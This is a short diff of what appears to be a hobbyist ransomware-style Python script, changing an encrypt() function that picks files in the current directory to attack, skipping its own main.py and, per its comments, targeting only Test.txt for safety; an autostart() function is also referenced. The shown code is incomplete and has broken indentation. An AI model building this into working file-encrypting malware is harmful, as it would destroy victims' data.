@@ -23,10 +23,11 @@ def autostart():
 def encrypt():
     # Finds the files and adds them to a list
     for file in os.listdir():
-#      if file == "main.py" :
-#           continue
-        #this is for beeing safe and it only attaks the Test 
-       if file !="Test.txt":
+        #This is so the Code does not Attack itself
+      if file == "main.py" :
+           continue
+        #this is for beeing safe and it only attaks the Test
+      if file !="Test.txt":
             continue
     files.append(file)
 
